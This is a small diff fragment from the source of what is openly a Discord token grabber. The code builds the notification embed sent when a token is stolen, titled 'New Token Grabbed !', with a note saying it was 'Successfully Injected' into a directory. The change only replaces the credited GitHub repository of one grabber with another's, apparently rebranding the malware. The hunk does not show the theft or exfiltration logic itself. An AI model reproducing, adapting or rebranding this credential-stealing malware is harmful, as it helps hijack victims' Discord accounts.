@@ -54,7 +54,7 @@ function injected() {
             color: 43690,
             description: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐅𝐮𝐥𝐥𝐲 𝐈𝐧𝐣𝐞𝐜𝐭𝐞𝐝 𝐢𝐧  ${__dirname}`,
             title: "𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !",
-            url: "https://github.com/GayarraFrost/DiscordTokenGrabber",
+            url: "https://github.com/kozune123/DISCORD_GRABBER",
             image: {
                 url: ""
             },
